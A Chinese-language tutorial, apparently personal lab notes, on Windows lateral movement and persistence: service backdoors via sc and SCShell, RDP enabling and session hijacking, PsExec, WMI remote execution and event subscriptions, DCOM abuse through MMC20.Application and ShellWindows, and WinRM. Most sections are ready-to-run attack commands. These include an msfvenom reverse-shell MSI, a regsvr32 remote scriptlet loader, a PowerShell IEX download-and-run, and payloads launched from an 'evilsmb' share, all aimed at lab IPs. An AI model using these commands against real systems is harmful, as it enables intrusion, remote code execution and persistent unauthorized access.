<p>命令执行之后，会显示失败</p>
<p>但是</p>
<p>没关系，还是执行了服务</p>
<p><font color='red'>删除服务</font></p>
<figure class="highlight livescript"><table><tr><td class="code"><pre><code class="hljs livescript">sc <span class="hljs-string">\\192.168.232.128</span> <span class="hljs-keyword">delete</span> Backdoor<br></code></pre></td></tr></table></figure>







<h2 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h2><p>地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/SpiderLabs/</span>SCShell<br></code></pre></td></tr></table></figure>



<p>SCShell是一款无文件横向移动工具</p>
<p>需要知道远程主机的管理员凭据和已知的服务</p>
<p>原理</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">通过修改远程主机的服务配置<br><br>将已知服务的二进制路径名修改为指定的程序或者攻击载荷，然后重启服务，攻击之后会将修改的路径自动恢复<br></code></pre></td></tr></table></figure>



<p>格式</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml">SCShell.exe <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">payload</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">domain</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight mipsasm"><table><tr><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">scshell.exe </span><span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">232</span>.<span class="hljs-number">135</span> defragsvc <span class="hljs-string">&quot;C:\windows\system32\cmd.exe /c echo &#x27; hello&#x27; &gt; c:\windows\temp\hello.txt&quot;</span> administrator admin            <span class="hljs-comment">#测试写入文件</span><br></code></pre></td></tr></table></figure>







<h3 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h3><p><font color='red'>首先用msf生成payload</font></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202221003882.png"  ><span class="image-caption">image-20230202221003882</span></p>
<p>记得一定要设置payload为windows的，它默认是python的payload</p>
<p><font color='cornflowerblue'>然后远程加载</font></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">SCShell</span>.exe <span class="hljs-number">192.168.232.135</span> XblAuthManager <span class="hljs-string">&quot;C:\Windows\System32\cmd.exe /c C:\Windows\System32\regsvr32 /s /n /u /i:http://192.168.232.129:8080/AusSXQGs.sct scrobj.dll&quot;</span> hack admin<br></code></pre></td></tr></table></figure>



<p>成功就会上线</p>
<p>但是测试失败</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230202221518477.png"  ><span class="image-caption">image-20230202221518477</span></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">关闭了UAC还是失败<br></code></pre></td></tr></table></figure>







<h1 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h1><p>需要开启3389端口</p>
<h2 id="判断是否开启远程桌面"><a href="#判断是否开启远程桌面" class="headerlink" title="判断是否开启远程桌面"></a>判断是否开启远程桌面</h2><figure class="highlight stata"><table><tr><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">reg</span> <span class="hljs-keyword">query</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections<br></code></pre></td></tr></table></figure>

<p>看结果，若为0，则表示RDP服务启动；若为1，则表示RDP服务禁用</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230203203306464.png"  ><span class="image-caption">image-20230203203306464</span></p>
<p>此结果表示禁用</p>
<p>本地开启远程桌面</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#开启远程桌面连接功能</span><br>reg <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f<br><br><span class="hljs-comment">#关闭“仅允许运行使用网络级别身份验证的远程桌面的计算机连接”（鉴权）</span><br>reg <span class="hljs-built_in">add</span> <span class="hljs-string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0<br><br><span class="hljs-comment">#设置防火墙策略，放行3389端口</span><br>netsh advfirewall<span class="hljs-built_in"> firewall </span><span class="hljs-built_in">add</span> rule <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;Remote Desktop&quot;</span> <span class="hljs-attribute">protocol</span>=TCP <span class="hljs-attribute">dir</span>=in <span class="hljs-attribute">localport</span>=3389 <span class="hljs-attribute">action</span>=allow<br></code></pre></td></tr></table></figure>



<p>开启远程主机的远程桌面连接功能</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">wmic /Node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">User</span>:Administrator /<span class="hljs-keyword">Password</span>:<span class="hljs-keyword">admin</span> RDTOGGLE <span class="hljs-keyword">WHERE</span> ServerName=<span class="hljs-string">&#x27;WIN2016-WEB3&#x27;</span> <span class="hljs-keyword">call</span> SetAllowTSConnections <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>





<h2 id="RDP-Hijacking-（远程桌面劫持）"><a href="#RDP-Hijacking-（远程桌面劫持）" class="headerlink" title="RDP Hijacking （远程桌面劫持）"></a>RDP Hijacking （远程桌面劫持）</h2><p>大致意思就是，在拥有system权限的前提下，能够不需要凭据，来进行任意的用户切换</p>
<p>即可以不需要密码，就可以登陆主机上拥有的账户</p>
<p>比如，现在我用账户A登陆，且拥有system的权限</p>
<p>寻找其他用户会话</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><code class="hljs dockerfile">query <span class="hljs-keyword">user</span><br></code></pre></td></tr></table></figure>



<p>执行上面命令之后，后面是有ID的</p>
<figure class="highlight applescript"><table><tr><td class="code"><pre><code class="hljs applescript">tscon <span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>

<p>这样就可以切换到其他会话</p>
<h2 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h2><p>这是一款开源的工具，其最大的优势在于，横向时，不用设置内网代理</p>
<p>将此工具上传到已经攻陷的主机，然后使用即可</p>
<p>地址</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/0xthirteen/</span>SharpRDP<br></code></pre></td></tr></table></figure>





<h1 id="PsExec"><a href="#PsExec" class="headerlink" title="PsExec"></a>PsExec</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>就是一款远程控制工具</p>
<h2 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h2><p>微软官方提供的工具，不怕杀软</p>
<p>具有命令行的交互性</p>
<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>利用SMB，连接到服务端的Admin$共享</p>
<p>然后释放名为psexesvc.exe的文件</p>
<p>注册名字为，PSEXESVC的服务</p>
<p>客户端执行命令时，服务端通过服务，来执行命令然后回显</p>
<p>运行结束之后，会自动删除生成的PSEXESVC服务</p>
<p><strong><font color='red'>简而言之，就是自己创建一个合法的服务，通过这个服务来执行命令</font></strong></p>
<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><p>目标机开启Admin$共享</p>
<p>目标机关闭防火墙，或者放行445端口</p>
<h2 id="操作-2"><a href="#操作-2" class="headerlink" title="操作"></a>操作</h2><p>打开目标机的cmd</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">#普通用户<br>psexec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span> -u Administrator -<span class="hljs-selector-tag">p</span> admin -s cmd<span class="hljs-selector-class">.exe</span>     <br><br>#域用户<br>psexec<span class="hljs-selector-class">.exe</span> -accepteula \\<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span> -u 域名\Administrator -<span class="hljs-selector-tag">p</span> admin -s cmd<span class="hljs-selector-class">.exe</span>    <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230203222323477.png"  ><span class="image-caption">image-20230203222323477</span></p>
<p>impacket工具包和msf里面都有psexec这款工具</p>
<p>impacket</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim">psexec.<span class="hljs-keyword">py</span><br></code></pre></td></tr></table></figure>

<p>msf</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">exploit<span class="hljs-regexp">/windows/</span>smb/psexec<br></code></pre></td></tr></table></figure>







<h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><p>WMI是一项windows的核心管理技术</p>
<p>可以管理本地和远程计算机</p>
<p>远程传输会用到两个协议</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">分布式组件对象模型	DCOM<br>windows远程管理		WinRM<br></code></pre></td></tr></table></figure>



<p>横向移动时，一般会用到两个方法</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">通过调用WMI的类方法，进行远程执行<br><br>远程部署WMI事件订阅，在特定的事件发生时触发攻击<br></code></pre></td></tr></table></figure>



<p><strong><font color='red'>WMI攻击条件</font></strong></p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">远程主机开启WMI，一般是默认开启<br><br>远程主机防火墙放行135端口，135端口是WMI的默认端口<br></code></pre></td></tr></table></figure>





<h2 id="常规利用方法"><a href="#常规利用方法" class="headerlink" title="常规利用方法"></a>常规利用方法</h2><p><strong><font color='red'>远程查询</font></strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#查询进程信息</span><br>wmic /node:192.168.232.135 /user:Administrator /password:admin process list brief <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204105105725.png"  ><span class="image-caption">image-20230204105105725</span></p>
<p><strong><font color='cornflowerblue'>远程创建进程</font></strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">#用cmd执行命令，把结果储存到C:\result.txt<br>wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span> process <span class="hljs-keyword">call</span> <span class="hljs-keyword">create</span> &quot;cmd.exe /c ipconfig &gt; C:\result.txt&quot;<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204110805993.png"  ><span class="image-caption">image-20230204110805993</span></p>
<p><font color='red'>WMIC在调用cmd执行命令时，是没有回显的，所以需要写入文件里面</font></p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204110844000.png"  ><span class="image-caption">image-20230204110844000</span></p>
<p><strong><font color='orange'>远程安装MSI文件</font></strong></p>
<p>把恶意的MSI文件放在，SMB服务器上，在跳板机上执行命令，远程执行安装MSI文件</p>
<p>生成MSI恶意文件</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.232.129 <span class="hljs-attribute">LPORT</span>=1111 -f msi  -o aaa.msi <br></code></pre></td></tr></table></figure>



<p>开启SMB匿名共享</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204113731756.png"  ><span class="image-caption">image-20230204113731756</span></p>
<p>跳板机执行远程安装，加载</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">wmic /node:<span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> /<span class="hljs-keyword">user</span>:administrator /<span class="hljs-keyword">password</span>:<span class="hljs-keyword">admin</span> product <span class="hljs-keyword">call</span> install PackageLocation=&quot;\\192.168.232.152\evilsmb\aaa.msi&quot;<br></code></pre></td></tr></table></figure>

<p>即可收到会话</p>
<h2 id="常见利用工具"><a href="#常见利用工具" class="headerlink" title="常见利用工具"></a>常见利用工具</h2><h3 id="wmiexec"><a href="#wmiexec" class="headerlink" title="wmiexec"></a>wmiexec</h3><p>执行有回显</p>
<p>属于impacket项目的一个工具</p>
<p>需要135和445端口，其中445端口开启的目的就是传输交互的信息</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> administrator:admin@<span class="hljs-number">192.168</span>.<span class="hljs-number">232.135</span><br><br><span class="hljs-keyword">python</span> wmiexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;domain&gt;</span>/<span class="hljs-symbol">&lt;username&gt;</span>:<span class="hljs-symbol">&lt;password&gt;</span>@<span class="hljs-symbol">&lt;ip&gt;</span><br></code></pre></td></tr></table></figure>

<p>用这个是需要安装impacket库的，但是这个库一直被防火墙拦截</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230204125300686.png"  ><span class="image-caption">image-20230204125300686</span></p>
<p>当然，如果跳板机没有python环境，也可以打包成exe文件</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell">pip install pyinstaller<br><br><span class="hljs-built_in">cd</span> impacket\examples<br><br>pyinstaller <span class="hljs-operator">-F</span> wmiexec.py<br></code></pre></td></tr></table></figure>

<p>exe文件的用法和py一样</p>
<h3 id="Invoke-WmiCommand"><a href="#Invoke-WmiCommand" class="headerlink" title="Invoke-WmiCommand"></a>Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1是powersploit的一个脚本</p>
<p>通过powershell来执行</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment">#远程加载Invoke-WmiCommand.psl脚本</span><br><span class="hljs-built_in">IEX</span>(<span class="hljs-built_in">New-Object</span> Net.Webclient).DownloadString(<span class="hljs-string">&#x27;http://IP地址:端口/Invoke-WmiCommand.ps1&#x27;</span>)<br><br><span class="hljs-comment">#指定远程系统用户</span><br><span class="hljs-variable">$User</span> = <span class="hljs-string">&quot;域名\用户名&quot;</span><br><br><span class="hljs-comment">#指定用户密码</span><br><span class="hljs-variable">$Password</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-literal">-String</span> <span class="hljs-string">&quot;密码&quot;</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span><br><br><span class="hljs-comment">#将用户名和密码整合，以便导入Credential</span><br><span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span> System.Management.Automation.PSCredential <span class="hljs-literal">-ArgumentList</span> <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span><br><br><span class="hljs-comment">#输入要执行的命令</span><br><span class="hljs-variable">$Remote</span> = <span class="hljs-built_in">Invoke-WmiCommand</span> <span class="hljs-literal">-Payload</span> &#123;ipconfig命令&#125; <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span> <span class="hljs-literal">-ComputerName</span> <span class="hljs-string">&quot;192.168.232.135&quot;</span><br><br><span class="hljs-comment">#输出回显</span><br><span class="hljs-variable">$Remote</span>.PayloadOutput<br></code></pre></td></tr></table></figure>

<p>用python开启一个http服务，来远程加载Invoke-WmiCommand.ps1</p>
<p>测试无法成功</p>
<h2 id="WMI事件订阅的利用"><a href="#WMI事件订阅的利用" class="headerlink" title="WMI事件订阅的利用"></a>WMI事件订阅的利用</h2><p><font color='red'>主要用于权限维持，也可以用于横向</font></p>
<h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>WMI的事件处理功能及其强大，几乎可以对操作系统上发生的任何事情做出响应</p>
<p>WMI事件订阅主要包括两大板块：事件过滤器（event filter）、事件消费者（event consumer）</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">当创建一个进程时<br>通过WMI事件订阅来执行预先设置的特定脚本<br><br>触发事件的具体条件称为“事件过滤器”<br><br>对指定事件发生所作出的响应称为“事件消费者”<br></code></pre></td></tr></table></figure>



<p>所有的事件过滤器被存储在一个ROOT\subscription:_ _EventFilter对象的实例</p>
<p>通过创建_ _EventFilter对象实例来部署事件过滤器</p>
<p>事件消费者是基于ROOT\subscription:_ _EventConsumer系统派生来的类</p>
<p><font color='red'>部署事件订阅时，需要分别构建Filter和Consumer，并将二者绑在一起</font></p>
<p><font color='cornflowerblue'>使用该技术需要提供远程主机的管理员的用户凭据</font></p>
<h3 id="手动利用"><a href="#手动利用" class="headerlink" title="手动利用"></a>手动利用</h3><h3 id="Sharp-WMIEvent"><a href="#Sharp-WMIEvent" class="headerlink" title="Sharp-WMIEvent"></a>Sharp-WMIEvent</h3><p>这是利用写好的powershell脚本，比手工利用更加方便</p>
<p>首先搭建SMB共享服务，将攻击载荷上传在共享目录</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230206230317392.png"  ><span class="image-caption">image-20230206230317392</span></p>
<p>然后在跳板机执行如下命令</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><code class="hljs pgsql">Sharp-WMIEvent -<span class="hljs-keyword">Trigger</span> <span class="hljs-type">Interval</span> -IntervalPeriod <span class="hljs-number">60</span> -ComputerName <span class="hljs-number">192.168</span><span class="hljs-number">.232</span><span class="hljs-number">.135</span> -<span class="hljs-keyword">Domain</span> aaa -<span class="hljs-keyword">User</span> Administrator -<span class="hljs-keyword">Password</span> <span class="hljs-keyword">admin</span> -Command &quot;cmd.exe / c \\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;<br></code></pre></td></tr></table></figure>

<p>执行之后，在远程主机上会部署一个随机命名的永久事件订阅，并每隔60秒执行一次SMB共享中的载荷，使远程主机上线</p>
<h1 id="DCOM的利用"><a href="#DCOM的利用" class="headerlink" title="DCOM的利用"></a>DCOM的利用</h1><h2 id="COM和DCOM"><a href="#COM和DCOM" class="headerlink" title="COM和DCOM"></a>COM和DCOM</h2><p>com（组件对象模型）</p>
<p>com是微软的一套软件组件的二进制接口标准</p>
<p>实现跨编程语言的进程直接可以通信，可以创建动态对象</p>
<p>允许代码重用而无需编译</p>
<p>COM 中的组件是特定于平台的二进制文件，符合标准的应用程序和其他组件可以使用</p>
<p><font color='red'>使用组件服务的程序包含指向其标准化接口的指针，而不是访问组件的底层数据结构。因此，无论组件如何工作或使用何种语言编写，组件都可以相互通信</font></p>
<p>dcom（分布式组件对象模型）</p>
<p>dcom是com的扩展</p>
<p>dcom是基于com的一系列概念和程序接口</p>
<p>支持不同机器上的组件进行通信</p>
<p>可以是客户端程序对象能够请求来自网络中的另一台计算机上的服务器程序对象</p>
<p><font color='red'>可以允许应用程序实例化和访问远程计算机上的com对象</font></p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><code class="hljs avrasm">DCOM使用远程过程调用技术（RPC）将<span class="hljs-keyword">COM</span>的功能扩展到本地计算机之外<br></code></pre></td></tr></table></figure>



<p>综上能进行横向的就只能是DCOM</p>
<h2 id="DCOM横向移动"><a href="#DCOM横向移动" class="headerlink" title="DCOM横向移动"></a>DCOM横向移动</h2><p>不是说DCOM支持远程访问就能够进行横向</p>
<p>真正的是因为</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">部分的DCOM组件公开的接口，包含不安全的方法<br></code></pre></td></tr></table></figure>



<p>常用包含不安全方法的组件</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">MMC20.<span class="hljs-class">Application</span></span><br><br><span class="hljs-variable">Excel.<span class="hljs-class">Application</span></span><br><br><span class="hljs-variable">ShellWindows</span><br><br><span class="hljs-variable">ShellBrowserWindow</span><br></code></pre></td></tr></table></figure>



<p>查看计算机上所有的DCOM程序组件</p>
<figure class="highlight vbnet"><table><tr><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">Get</span>-CimInstance Win32_DCOMApplication<br><br><span class="hljs-keyword">Get</span>-WmiObject -<span class="hljs-keyword">Namespace</span> ROOT\CIMV2 -<span class="hljs-keyword">Class</span> Win32_DCOMApplication <br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207115402041.png"  ><span class="image-caption">image-20230207115402041</span></p>
<p>条件</p>
<p>从上面的命令可以看出，DCOM组件的横向利用，是需要powershell的</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">拥有管理器权限的powershell<br><br>未开启防火墙<br></code></pre></td></tr></table></figure>





<h3 id="MMC20-Application"><a href="#MMC20-Application" class="headerlink" title="MMC20.Application"></a>MMC20.Application</h3><p>MMC20.Application对象的Document.ActiveView下存在一个ExecuteShellCommand方法</p>
<p>可以用来启动子进程并运行执行的程序或系统命令</p>
<figure class="highlight isbl"><table><tr><td class="code"><pre><code class="hljs isbl">原理就是<span class="hljs-variable">MMC20.<span class="hljs-class">Application</span></span>会启动一个进程<span class="hljs-variable">aaa.exe</span><br><br><span class="hljs-variable">ExecuteShellCommand</span>可以在进程中创建子进程，子进程就可以是我们的攻击载荷<br></code></pre></td></tr></table></figure>

<p><font color='red'>适用于win7及其以上版本</font></p>
<p>首先搭建SMB匿名共享，然后放入后门文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">python smbserver.py evilsmb <span class="hljs-regexp">/root/</span>share -smb2support <br></code></pre></td></tr></table></figure>



<p>现在需要对方主机的管理员权限的powershell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/netonly /u</span>ser:aaa\administrator powershell<br><br>a<span class="hljs-string">&#x27;a&#x27;</span>a：对方主机电脑名 （可省略）<br>administrator：管理员组的用户的用户名<br></code></pre></td></tr></table></figure>

<p>输入之后需要对方管理员的凭据</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207142522182.png"  ><span class="image-caption">image-20230207142522182</span></p>
<p>然后执行如下命令</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">#通过ProgID与DCOM进行远程交互<br><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[type]</span>::<span class="hljs-built_in">GetTypeFromProgID</span>(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;192.168.232.136&quot;</span>))<br><br>#调用ExecuteShellCommand方法启动进程，运行攻击载荷<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.ActiveView</span><span class="hljs-selector-class">.ExecuteShellCommand</span>(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c\\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;</span>, <span class="hljs-string">&quot;minimized&quot;</span>)<br></code></pre></td></tr></table></figure>







<h3 id="ShellWindows"><a href="#ShellWindows" class="headerlink" title="ShellWindows"></a>ShellWindows</h3><p>shellwindows这个组件提供了Document.Application.ShellExecute方法</p>
<p>可以启动指定的子进程来运行指定的程序或系统命令</p>
<p>ShellWindows对象没有ProgID，需要使用CLSID来创建实例</p>
<p>需要使用OleViewDotNet来找到CLSID</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">9BA05972</span>-F6A8-<span class="hljs-number">11</span>CF-A442-<span class="hljs-number">00</span>A0C90A8F39<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207194006281.png"  ><span class="image-caption">image-20230207194006281</span></p>
<p>和MMC20.Application差不多，也是需要对方的管理员权限的powershell</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">runas <span class="hljs-regexp">/netonly /u</span>ser:aaa\administrator powershell<br><br>aaa：对方主机电脑名 （可省略）<br>administrator：管理员组的用户的用户名<br></code></pre></td></tr></table></figure>



<p>然后弹出拥有对方管理员权限的powershell</p>
<p>然后</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus">#建立远程交互<br><span class="hljs-variable">$com</span> = <span class="hljs-selector-attr">[Activator]</span>::<span class="hljs-built_in">CreateInstance</span>(<span class="hljs-selector-attr">[Type]</span>::<span class="hljs-built_in">GetTypeFromCLSID</span>(<span class="hljs-string">&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;</span>, <span class="hljs-string">&quot;192.168.232.137&quot;</span>))<br><br>#调用shellexecute方法启动子进程，远程开启计算机程序<br><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>, <span class="hljs-string">&quot;C:\Windows\System32&quot;</span>, <span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202751398.png"  ><span class="image-caption">image-20230207202751398</span></p>
<p>也可以通过SMB服务，进行远程执行恶意文件</p>
<p>修改这一项即可</p>
<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202909382.png"  ><span class="image-caption">image-20230207202909382</span></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><code class="hljs stylus"><span class="hljs-variable">$com</span><span class="hljs-selector-class">.Item</span>()<span class="hljs-selector-class">.Document</span><span class="hljs-selector-class">.Application</span><span class="hljs-selector-class">.ShellExecute</span>(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c \\192.168.232.152\evilsmb\hobbyhorse_x64.exe&quot;</span>, <span class="hljs-string">&quot;C:\Windows\System32&quot;</span>, <span class="hljs-variable">$null</span>,<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure>

<p><img  src="https://typora-1313982205.cos.ap-beijing.myqcloud.com/image-20230207202953150.png"  ><span class="image-caption">image-20230207202953150</span></p>
<p><font color='red'>总结</font></p>
<p>不同与MMC20.Application的是，ShellWindows并不会创建新进程，而是在已有的explorer.exe进程中创建并且执行子进程</p>
<h3 id="ShellBrowserWindow"><a href="#ShellBrowserWindow" class="headerlink" title="ShellBrowserWindow"></a>ShellBrowserWindow</h3><p>同ShellWindows一样，也是调用Document.Application.ShellExecute方法，在explorer.exe进程下创建子进程</p>
<p>不同的是</p>
<p><strong><font color='red'>它只适用于windows 10和windows server 2012</font></strong></p>
<h1 id="WinRM的利用"><a href="#WinRM的利用" class="headerlink" title="WinRM的利用"></a>WinRM的利用</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>WinRM是通过一个叫WS-Management协议，来实现远程管理的</p>
<p>WS-Management协议</p>
<figure class="highlight"><table><tr><td class="code"><pre><code class="hljs">用来进行远程软硬件管理的web服务协议<br><br>在同一个网络内，允许两台计算机相互通信<br><br>对应5985端口<br></code></pre></td></tr></table></figure>

<p>只要启动了服务，防火墙就会放行对应的端口，不会阻拦</p>
<p><font color='red'>在windows server 2008以上WinRM是默认开启的</font></p>
<p><font color='red'>Win7系统中却默认安装此WinRM服务，但是默认为禁用状态，Win8系统和Win10系统也都默认关闭WinRM服务</font></p>
<p>需要管理员的凭据</p>
<h2 id="通过WinRM执行远程命令"><a href="#通过WinRM执行远程命令" class="headerlink" title="通过WinRM执行远程命令"></a>通过WinRM执行远程命令</h2><p>要用到两个工具winrs、winrm</p>
<p><font color='red'>在首次用到这两个工具时，需要设置信任</font></p>
<p>将目标ip设置为信任ip，添加到信任列表</p>
<p><font color='red'>设置信任列表的前提是需要把跳板机网络连接改为专用网络，否则无法开启</font>（这一点在本地测试时要注意，但是在实际的环境中，一般都是域，无需过多注意）</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#打开WinRM服务</span><br>winrm quickconfig -q<br><br><span class="hljs-comment">#cmd设置</span><br>winrm <span class="hljs-built_in">set</span> winrm/config<span class="hljs-built_in">/client </span>@&#123;<span class="hljs-attribute">TrustedHosts</span>=<span class="hljs-string">&quot;ip地址&quot;</span>&#125;<br><br><span class="hljs-comment">#powershell设置</span><br>Set-Item WSMan:localhost\client\trustedhosts -value *<br><br>其中IP地址可以设置为*，表示信任任何ip<br></code></pre></td></tr></table></figure>



<h3 id="winrs"><a href="#winrs" class="headerlink" title="winrs"></a>winrs</h3><p>winrs是WinRM提供的客户端程序，在双方都开启WinRM服务的前提下，可以远程执行命令</p>
